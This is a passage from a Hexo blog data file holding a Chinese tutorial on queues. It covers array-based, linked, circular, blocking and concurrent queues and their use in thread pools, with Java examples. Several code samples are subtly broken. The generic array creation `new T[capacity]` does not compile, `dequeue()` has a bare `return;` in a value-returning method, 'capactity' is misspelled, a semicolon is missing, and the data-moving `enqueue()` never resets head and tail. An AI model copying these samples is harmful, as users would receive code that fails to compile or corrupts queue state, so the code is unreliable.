[]).push({});\n</script>\n","source":"_posts/算法-队列.md","raw":"---\ntitle: 算法-队列\ndate: 2018-09-16 00:18:36\ntags: ['算法','队列']\ncategories: 算法\n---\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n我们知道，CPU资源是有限的，任务的处理逻辑与线程个数并不是正相关。相反，过多的线程反而会导致CPU频繁切换，处理性能下降。所以，线程池的大小一般都是综合考虑要处理任务的特点与硬件环境，来事先设置的。\n\n当我们向一个固定大小的线程池中请求一个线程时，如果线程池中没有空闲资源了，这个时候线程池如何处理这个请求？是拒绝请求还是排队请求？各种处理策略又是如何实现的？\n\n其实，这些问题并不复杂，其底层的数据结构就是今天的内容，**队列(queue)**。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 如何理解队列\n{% endnote %}\n</div>\n\n队列这个概念非常好理解，你可以把它想象成排队买票，先来的先买，后来的人只能站末尾，不允许插队。**先进者先出，这就是典型的队列**。\n\n我们知道，栈只支持两个操作：**入栈push()和出栈pop()**，队列和栈非常类似，支持的操作只有：**入队enqueue()**，将一个数据放入队尾，**出队dequeue()**，从队头取出一个数据。\n\n{% asset_img 队列.jpg %}\n\n所以，队列跟栈一样，也是一种操作受限的线性表数据结构。\n\n队列的概念很好理解，基本操作也很容易掌握。作为一种非常基础的数据结构，队列的应用也非常广泛。特别是一些具有额外特性的队列，比如循环队列、阻塞队列、并发队列。它们在很多片底层系统、框架、中间件的开发中，起着关键性的作用。比如高性能队列Disruptor、Linux环形存储，都用到了循环队列；java.concurent并发包中用到了ArrayBlockingQueue来实现公平锁等。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 顺序队列和链式队列\n{% endnote %}\n</div>\n\n我们知道了，队列跟栈一样，也是一种抽象的数据结构。它具有先进先出的特性，支持在队尾插入元素，在对头删除元素，那么究竟该如何实现一个队列呢？\n\n跟栈一样，队列可以用数组实现，也可以用链表实现。用数组实现的栈叫做顺序栈，用链表实现的栈叫做链式栈。同样，用数组实现的队列叫做**顺序队列**，用链表实现的队列叫做**链式队列**。\n\n先来看下基于数组的实现方法。我这里采用java语言进行实现，不会涉及高级语法。\n\n```java\n// 基于数组实现的队列\npublic class ArrayQueue<T>{\n\t// 数组items\n\tprivate T[] items;\n\t// 队列大小\n\tprivate int size=0;\n\tprivate int capacity;\n\t// head表示队头下标，tail表示队尾下标\n\tprivate int head=0;\n\tprivate int tail=0;\n\n\tpublic ArrayQueue(){\n\t\tthis(10); // 队列默认容量给10\n\t}\n\tpublic ArrayQueue(int capacity){\n\t\tthis.items = new T[capacity];\n\t\tthis.capacity = capacity;\n\t}\n\n\tpublic boolean enqueue(T val){\n\t\tif(size == capacity){return false;} // 队列满了\n\t\titems[tail] = val;\n\t\tsize ++;\n\t\ttail ++;\n\t\treturn true;\n\t}\n\n\tpublic T dequeue(){\n\t\tif (size == 0) {\n\t\t\treturn;\n\t\t}\n\t\tT res = items[head];\n\t\thead++;\n\t\tsize--;\n\t\treturn res;\n\t}\n}\n```\n比起栈的数组实现，队列的数组实现稍微有点复杂。\n\n对于栈来说，我们只需要一个栈顶指针就可以了，但是队列需要两个指针：一个head指针，指向队头；一个tail指针，指向队尾。\n\n你可以结合下面这幅图来理解。当a、b、c、d...依次入队之后，指针中的head指针指向下标为1的位置，tail指针指向下标为7的位置。\n\n{% asset_img 示例1.jpg %}\n\n当我们调用两次出队操作之后，队列中的head指针指向下标为5的位置，tail仍然指向下标为7的位置。\n\n{% asset_img 示例2.jpg %}\n\n你肯定已经发现了，随着不停的入队、出队操作，head、tail都会持续往后移动。当tail移动到最右边，即使数组中还有空闲空间，也无法继续往队列中添加数据了。这个问题如何解决呢？\n\n在数组那一节中，我们遇到过同样的问题，数组的删除操作会导致数组中的数据不连续，还记得我们怎么解决得吗？**数据搬移**！，但是每次出队时都相当于删除数组下标为0的数据，要搬移整个队列中的数据，这样队列的出队时间复杂度就从原来的O(1)变为了O(n)，能不能优化呢？\n\n实际上，我们在出队时可以不用搬移数据，如果没有空闲空间了，我们只需要在入队时，在集中触发一次数据的搬移操作。借助这个思想，出队函数保持不变，我们稍加改造一下入队函数enqueue()实现，就可以轻松解决刚才的问题了。\n\n```java\npublic boolean enqueue(T val){\n\tif(size == capacity){return false;} // 队列满了\n\t// tail到尾部，队列没有满\n\tif (tail == capactity && size<capacity) {\n\t\t// 数据搬移\n\t\tfor (int i=head;i<tail;i++) {\n\t\t\t// 将head到tail的数据搬移到0到size的位置\n\t\t\titems[i-head] = items[i]\n\t\t}\n\t}\n\t\n\titems[tail] = val;\n\tsize ++ ;\n\ttail ++;\n\treturn true;\n}\n```\n\n从代码中我们可以看到，当队列tail指针移动到数组的最右边后，且数组没有满时，如果有新的数据入队，我们可以将head-tail之间的数据，整体搬移到0-size之间的位置，\n\n这种思路中，出队的时间复杂度仍然是O(1)，但是入队的时间复杂度还是O(n)吗？此处用以前讲过的**摊还分析法**自行分析一下。\n\n接下来，我们看看**基于链表的队列的实现方法**。\n\n基于链表的实现，我们同样需要两个指针：head指针和tail指针。他们分别指向第一个结点和最后一个结点。入队时，tail->next = newNode, tail = tail->next;出队时，head = head->next。\n\n我将具体代码放到我的[github](https://github.com/AriesRen/algorithm)上，有需要的可以看看。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 循环队列\n{% endnote %}\n</div>\n\n我们上面用数组实现的队列，在tail=capacity的时候，会有数据搬移操作，这样入队操作性能就会受到影响。那有没有办法能够避免数据搬移操作呢？我们来看看循环队列的解决思路。\n\n循环队列，顾名思义，它长得像一个环。原本数组是有头有尾的，是一条直线，我们现在把首尾相连，掰成了一个环，可以通过下图直观感受一下。\n\n{% asset_img 循环队列.jpg %}\n\n我们可以看到，图中这个队列的大小为8，当前head=0，tail=3.当有一个新的元素d入队时，我们放入到下标为3的位置，并将tail指向4。当tail指向7，这时候再有新的元素入队时，我们并不将tail更新为8，而是将tail指向0，如果再有元素入队，放入下标为0处的位置，并将tail更新为1。当然如果head=0处没有出队的话，就说明队列满了。\n\n通过这样的方法，我们成功的避免了数据搬移操作，看起来不难理解，但是循环队列的代码实现难度要比前面讲的非循环队列难多了。要想写出没有bug的循环队列的实现代码，最关键的是，**确定队列空和队列满的判定条件**。\n\n在用数组实现的队列中，对空的判定条件是head==tail，队列满的条件是tail==capacity。那针对循环队列，如何判断队满和队空呢？\n\n队列为空的条件仍然是head==tail，但是队列满了的判断条件就复杂了，我画了如下一张队列满的图，可以看一下队满的规律。\n\n{% asset_img 循环队列满.jpg %}\n\n图中队列满时，tail=3，head=4，size=8，capacity=8，多画几张队满的图，就会发现队满时（tail+1）%capacity = head。同时，head和tail不能简单的使用++或者--，得出规律tail=(tail+1)%capacity，head=(head+1)%capacity。\n\n下面看下一下循环队列的代码：\n```java\n// 基于数组实现的循环队列\npublic class CircularQueue<T> implements Queue<T> {\n    // 数组items\n    private Object[] items;\n    // 队列大小\n    private int size=0;\n    private int capacity;\n    // head表示队头下标，tail表示队尾下标\n    private int head=0;\n    private int tail=0;\n\n    public CircularQueue(){\n        this(10); // 队列默认容量给10\n    }\n    public CircularQueue(int capacity){\n        this.items = new Object[capacity];\n        this.capacity = capacity;\n    }\n\n    public boolean enqueue(T val){\n        if ((tail+1)%capacity == head){\n            throw new RuntimeException(\"循环队列满了！\");\n        }\n        items[tail] = val;\n        tail = (tail+1)%capacity;\n        size ++;\n        return true;\n    }\n\n    public T dequeue(){\n       if (size<=0){\n           throw new RuntimeException(\"空队列！\");\n       }\n       T res = (T) items[head];\n       size--;\n       head = (head+1)%capacity;\n       return res;\n    }\n\n    @Override\n    public String toString() {\n        return Arrays.toString(items);\n    }\n\n    @Override\n    public int size() {\n        return size;\n    }\n}\n```\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 阻塞队列和并发队列\n{% endnote %}\n</div>\n\n上面讲的都是些理论知识，看起来很难跟实际项目扯上关系，确实，队列这种数据结构很基础，平时的业务开发不大可能从零开始实现一个队列，甚至都不会直接用到。而一些具有特殊特性的队列应用却比较广泛，如阻塞队列和并发队列。\n\n**阻塞队列**其实就是在队列基础上增加了阻塞操作。简单来说，就是在队列为空的时候，从对头取数据会被阻塞。并未此时还没有数据可取，直到队列中有了数据才能返回；如果队列已经满了，那么插入数据的操作就会被阻塞，直到队列中有空闲位置后在插入数据，然后在返回。\n\n{% asset_img 阻塞队列.jpg %}\n\n你应该已经发现了，上述的定义就是一个\"生产者-消费者模型\"！是的，我们可以用阻塞队列轻松实现一个\"生产者-消费者模型\"。\n\n这种基于阻塞队列实现的\"生产者-消费者模型\"可以有效的协调生产和消费的速度。当\"生产者\"生产数据的速度过快，\"消费者\"来不及消费时，存储数据的队列很快就会满了，这个时候，生产者就阻塞等待，直到\"消费者\"消费了数据，\"生产者\"才会被唤醒继续生产。\n\n而且不仅如此，基于阻塞队列，我们可以通过协调\"生产者\"和\"消费者\"的个数，来提高数据处理的效率。比如前面的例子，我们可以配备多个\"消费者\"，来对应一个\"生产者\"。\n\n{% asset_img 多消费者阻塞队列.jpg %}\n\n前面讲了阻塞队列，在多线程情况下，会有多个线程同时操作队列，这个时候就会存在线程安全问题，那如何实现一个线程安全的队列呢？\n\n线程安全的队列我们叫做**并发队列**。最简单直接的实现方式是直接在enqueue()、dequeue()上加锁，但是这样锁粒度大并发较低，同一时刻仅允许一个村或者取操作。实际上，基于数组的循环队列，利用CAS原子操作，可以实现非常高效的并发队列。这也是循环队列比链式队列应用更加广泛的原因。\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 解答开篇\n{% endnote %}\n</div>\n\n队列的知识讲完了，我们来看一下开篇的问题。线程池没有空闲线程时，新的任务请求线程资源时，线程池该如何处理，各种处理策略又是如何实现的呢？\n\n我们一般有两种处理策略。第一种是非阻塞的处理方式，直接拒绝任务请求；另一种是阻塞的处理方式，将请求进行排队，等到有空闲线程时，取出队列中的请求继续处理。那如何存储排队的请求呢？\n\n我们希望公平的处理每个排队的请求，先进者先出，所以队列这种数据结构很适合存储排队请求。我们前面说过，队列有基于链表和基于数组这两种方式，那这两种实现方式对于排队请求又有什么区别呢？\n\n基于链表实现的方式，可以实现一个支持无限排队的无界队列，但是可能会导致过多的请求排队等待，请求处理的响应时间过长。所以，针对响应时间较敏感的系统，基于链表实现的无限排队的线程池是不合适的。\n\n而基于数组实现的有界队列，队列的大小有限，所以线程池中排队的请求超过队列大小时，接下来的请求就会被拒绝，这种方式对响应时间敏感的系统，就相对来说比较合理。不过设置一个合适的队列大小，也是非常有讲究的。队列太大导致等待的请求太多，队列太小会导致无法充分利用系统资源，发挥最大性能。\n\n除了前面讲到的应用在线程池请求排队的场景之外，队列还可以应用在任何有限资源池中，用于排队请求，比如数据库连接池。实际上，对于大部分资源有限的场景，当没有空闲资源时，基本上都可以通过队列这种数据结构来实现队列请求排队。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 内容小结\n{% endnote %}\n</div>\n\n今天我们讲了一种跟栈很相似的数据结构，队列。\n\n队列最大的特点就是先进先出，主要的两个操作是入队和出队。跟栈一样，它既可以用数组来实现，也可以用链表来实现。用数组实现的叫顺序队列，用链表实现的叫链式队列。特别是一个长得像环一样的叫循环队列。在用数组实现的队列时，会有数据搬移的工作，要想解决数据搬移的工作，我们就需要像环一样的循环队列。\n\n循环队列是这篇的重点，要想写出没有bug的循环队列的实现代码，关键是要确定队满和队空的判定条件。\n\n除此之外，还有几种高级的数据结构，阻塞队列、并发队列，但是底层都是队列这种数据结构，只不过附加了其他的一些功能。阻塞队列就是可以对出队、入队操作进行阻塞，并发队列就是保证了多线程的队列操作线程安全。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 课后思考\n{% endnote %}\n</div>\n\n1、 除了线程池这种池结构会用到队列排队请求，你还知道那些类似的数据结构或者场景会用到队列的排队请求。\n\n如数据库的连接池、分布式应用中的消息队列（kafka、MQ）\n\n2、 关于并发队列，如何实现无锁的并发队列。\n\n> 提示： CAS(compare and swap) 乐观锁 悲观锁\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n","slug":"算法-队列","published":1,"updated":"2019-06-26T03:52:03.528Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2mv005ao25ti38rh62y","content":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>我们知道，CPU资源是有限的，任务的处理逻辑与线程个数并不是正相关。相反，过多的线程反而会导致CPU频繁切换，处理性能下降。所以，线程池的大小一般都是综合考虑要处理任务的特点与硬件环境，来事先设置的。</p>\n<p>当我们向一个固定大小的线程池中请求一个线程时，如果线程池中没有空闲资源了，这个时候线程池如何处理这个请求？是拒绝请求还是排队请求？各种处理策略又是如何实现的？</p>\n<p>其实，这些问题并不复杂，其底层的数据结构就是今天的内容，<strong>队列(queue)</strong>。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"如何理解队列\"><a href=\"#如何理解队列\" class=\"headerlink\" title=\"如何理解队列\"></a>如何理解队列</h3></div><br></div>\n\n<p>队列这个概念非常好理解，你可以把它想象成排队买票，先来的先买，后来的人只能站末尾，不允许插队。<strong>先进者先出，这就是典型的队列</strong>。</p>\n<p>我们知道，栈只支持两个操作：<strong>入栈push()和出栈pop()</strong>，队列和栈非常类似，支持的操作只有：<strong>入队enqueue()</strong>，将一个数据放入队尾，<strong>出队dequeue()</strong>，从队头取出一个数据。</p>\n<img src=\"/posts/2018-09-16-算法-队列/队列.jpg\">\n<p>所以，队列跟栈一样，也是一种操作受限的线性表数据结构。</p>\n<p>队列的概念很好理解，基本操作也很容易掌握。作为一种非常基础的数据结构，队列的应用也非常广泛。特别是一些具有额外特性的队列，比如循环队列、阻塞队列、并发队列。它们在很多片底层系统、框架、中间件的开发中，起着关键性的作用。比如高性能队列Disruptor、Linux环形存储，都用到了循环队列；java.concurent并发包中用到了ArrayBlockingQueue来实现公平锁等。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"顺序队列和链式队列\"><a href=\"#顺序队列和链式队列\" class=\"headerlink\" title=\"顺序队列和链式队列\"></a>顺序队列和链式队列</h3></div><br></div>\n\n<p>我们知道了，队列跟栈一样，也是一种抽象的数据结构。它具有先进先出的特性，支持在队尾插入元素，在对头删除元素，那么究竟该如何实现一个队列呢？</p>\n<p>跟栈一样，队列可以用数组实现，也可以用链表实现。用数组实现的栈叫做顺序栈，用链表实现的栈叫做链式栈。同样，用数组实现的队列叫做<strong>顺序队列</strong>，用链表实现的队列叫做<strong>链式队列</strong>。</p>\n<p>先来看下基于数组的实现方法。我这里采用java语言进行实现，不会涉及高级语法。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 基于数组实现的队列</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ArrayQueue</span>&lt;<span class=\"title\">T</span>&gt;</span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">// 数组items</span></span><br><span class=\"line\">\t<span class=\"keyword\">private</span> T[] items;</span><br><span class=\"line\">\t<span class=\"comment\">// 队列大小</span></span><br><span class=\"line\">\t<span class=\"keyword\">private</span> <span class=\"keyword\">int</span> size=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">private</span> <span class=\"keyword\">int</span> capacity;</span><br><span class=\"line\">\t<span class=\"comment\">// head表示队头下标，tail表示队尾下标</span></span><br><span class=\"line\">\t<span class=\"keyword\">private</span> <span class=\"keyword\">int</span> head=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">private</span> <span class=\"keyword\">int</span> tail=<span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">ArrayQueue</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">this</span>(<span class=\"number\">10</span>); <span class=\"comment\">// 队列默认容量给10</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">ArrayQueue</span><span class=\"params\">(<span class=\"keyword\">int</span> capacity)</span></span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">this</span>.items = <span class=\"keyword\">new</span> T[capacity];</span><br><span class=\"line\">\t\t<span class=\"keyword\">this</span>.capacity = capacity;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">boolean</span> <span class=\"title\">enqueue</span><span class=\"params\">(T val)</span></span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(size == capacity)&#123;<span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;&#125; <span class=\"comment\">// 队列满了</span></span><br><span class=\"line\">\t\titems[tail] = val;</span><br><span class=\"line\">\t\tsize ++;</span><br><span class=\"line\">\t\ttail ++;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> T <span class=\"title\">dequeue</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (size == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tT res = items[head];</span><br><span class=\"line\">\t\thead++;</span><br><span class=\"line\">\t\tsize--;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> res;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>比起栈的数组实现，队列的数组实现稍微有点复杂。</p>\n<p>对于栈来说，我们只需要一个栈顶指针就可以了，但是队列需要两个指针：一个head指针，指向队头；一个tail指针，指向队尾。</p>\n<p>你可以结合下面这幅图来理解。当a、b、c、d…依次入队之后，指针中的head指针指向下标为1的位置，tail指针指向下标为7的位置。</p>\n<img src=\"/posts/2018-09-16-算法-队列/示例1.jpg\">\n<p>当我们调用两次出队操作之后，队列中的head指针指向下标为5的位置，tail仍然指向下标为7的位置。</p>\n<img src=\"/posts/2018-09-16-算法-队列/示例2.jpg\">\n<p>你肯定已经发现了，随着不停的入队、出队操作，head、tail都会持续往后移动。当tail移动到最右边，即使数组中还有空闲空间，也无法继续往队列中添加数据了。这个问题如何解决呢？</p>\n<p>在数组那一节中，我们遇到过同样的问题，数组的删除操作会导致数组中的数据不连续，还记得我们怎么解决得吗？<strong>数据搬移</strong>！，但是每次出队时都相当于删除数组下标为0的数据，要搬移整个队列中的数据，这样队列的出队时间复杂度就从原来的O(1)变为了O(n)，能不能优化呢？</p>\n<p>实际上，我们在出队时可以不用搬移数据，如果没有空闲空间了，我们只需要在入队时，在集中触发一次数据的搬移操作。借助这个思想，出队函数保持不变，我们稍加改造一下入队函数enqueue()实现，就可以轻松解决刚才的问题了。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">boolean</span> <span class=\"title\">enqueue</span><span class=\"params\">(T val)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(size == capacity)&#123;<span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;&#125; <span class=\"comment\">// 队列满了</span></span><br><span class=\"line\">\t<span class=\"comment\">// tail到尾部，队列没有满</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (tail == capactity &amp;&amp; size&lt;capacity) &#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">// 数据搬移</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i=head;i&lt;tail;i++) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"comment\">// 将head到tail的数据搬移到0到size的位置</span></span><br><span class=\"line\">\t\t\titems[i-head] = items[i]</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\titems[tail] = val;</span><br><span class=\"line\">\tsize ++ ;</span><br><span class=\"line\">\ttail ++;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>从代码中我们可以看到，当队列tail指针移动到数组的最右边后，且数组没有满时，如果有新的数据入队，我们可以将head-tail之间的数据，整体搬移到0-size之间的位置，</p>\n<p>这种思路中，出队的时间复杂度仍然是O(1)，但是入队的时间复杂度还是O(n)吗？此处用以前讲过的<strong>摊还分析法</strong>自行分析一下。</p>\n<p>接下来，我们看看<strong>基于链表的队列的实现方法</strong>。</p>\n<p>基于链表的实现，我们同样需要两个指针：head指针和tail指针。他们分别指向第一个结点和最后一个结点。入队时，tail-&gt;next = newNode, tail = tail-&gt;next;出队时，head = head-&gt;next。</p>\n<p>我将具体代码放到我的<a href=\"https://github.com/AriesRen/algorithm\" target=\"_blank\" rel=\"noopener\">github</a>上，有需要的可以看看。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"循环队列\"><a href=\"#循环队列\" class=\"headerlink\" title=\"循环队列\"></a>循环队列</h3></div><br></div>\n\n<p>我们上面用数组实现的队列，在tail=capacity的时候，会有数据搬移操作，这样入队操作性能就会受到影响。那有没有办法能够避免数据搬移操作呢？我们来看看循环队列的解决思路。</p>\n<p>循环队列，顾名思义，它长得像一个环。原本数组是有头有尾的，是一条直线，我们现在把首尾相连，掰成了一个环，可以通过下图直观感受一下。</p>\n<img src=\"/posts/2018-09-16-算法-队列/循环队列.jpg\">\n<p>我们可以看到，图中这个队列的大小为8，当前head=0，tail=3.当有一个新的元素d入队时，我们放入到下标为3的位置，并将tail指向4。当tail指向7，这时候再有新的元素入队时，我们并不将tail更新为8，而是将tail指向0，如果再有元素入队，放入下标为0处的位置，并将tail更新为1。当然如果head=0处没有出队的话，就说明队列满了。</p>\n<p>通过这样的方法，我们成功的避免了数据搬移操作，看起来不难理解，但是循环队列的代码实现难度要比前面讲的非循环队列难多了。要想写出没有bug的循环队列的实现代码，最关键的是，<strong>确定队列空和队列满的判定条件</strong>。</p>\n<p>在用数组实现的队列中，对空的判定条件是head==tail，队列满的条件是tail==capacity。那针对循环队列，如何判断队满和队空呢？</p>\n<p>队列为空的条件仍然是head==tail，但是队列满了的判断条件就复杂了，我画了如下一张队列满的图，可以看一下队满的规律。</p>\n<img src=\"/posts/2018-09-16-算法-队列/循环队列满.jpg\">\n<p>图中队列满时，tail=3，head=4，size=8，capacity=8，多画几张队满的图，就会发现队满时（tail+1）%capacity = head。同时，head和tail不能简单的使用++或者–，得出规律tail=(tail+1)%capacity，head=(head+1)%capacity。</p>\n<p>下面看下一下循环队列的代码：<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 基于数组实现的循环队列</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CircularQueue</span>&lt;<span class=\"title\">T</span>&gt; <span class=\"keyword\">implements</span> <span class=\"title\">Queue</span>&lt;<span class=\"title\">T</span>&gt; </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 数组items</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> Object[] items;</span><br><span class=\"line\">    <span class=\"comment\">// 队列大小</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> size=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> capacity;</span><br><span class=\"line\">    <span class=\"comment\">// head表示队头下标，tail表示队尾下标</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> head=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> tail=<span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">CircularQueue</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>(<span class=\"number\">10</span>); <span class=\"comment\">// 队列默认容量给10</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">CircularQueue</span><span class=\"params\">(<span class=\"keyword\">int</span> capacity)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.items = <span class=\"keyword\">new</span> Object[capacity];</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.capacity = capacity;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">boolean</span> <span class=\"title\">enqueue</span><span class=\"params\">(T val)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ((tail+<span class=\"number\">1</span>)%capacity == head)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> RuntimeException(<span class=\"string\">\"循环队列满了！\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        items[tail] = val;</span><br><span class=\"line\">        tail = (tail+<span class=\"number\">1</span>)%capacity;</span><br><span class=\"line\">        size ++;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> T <span class=\"title\">dequeue</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">       <span class=\"keyword\">if</span> (size&lt;=<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">           <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> RuntimeException(<span class=\"string\">\"空队列！\"</span>);</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">       T res = (T) items[head];</span><br><span class=\"line\">       size--;</span><br><span class=\"line\">       head = (head+<span class=\"number\">1</span>)%capacity;</span><br><span 